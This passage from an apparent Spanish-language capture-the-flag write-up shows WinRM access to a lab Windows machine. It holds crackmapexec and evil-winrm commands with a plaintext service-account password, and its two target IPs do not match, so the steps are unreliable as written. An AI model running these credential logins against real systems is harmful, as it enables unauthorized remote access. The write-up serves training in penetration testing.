## Vuln exploit & Gaining Access {-}

### Ganando accesso con Win-RM {-}

```bash
crackmapexec winrm 10.10.10.193 -u 'svc-print' -p '$fab@s3Rv1ce$1'
```

Aqui vemos quel usuario es (Pwn3d!)

```bash
evil-winrm -i 10.10.10.161 -u 'svc-print' -p '$fab@s3Rv1ce$1'
```

ya estamos a dentro de la maquina y podemos ver la flag del usuario.

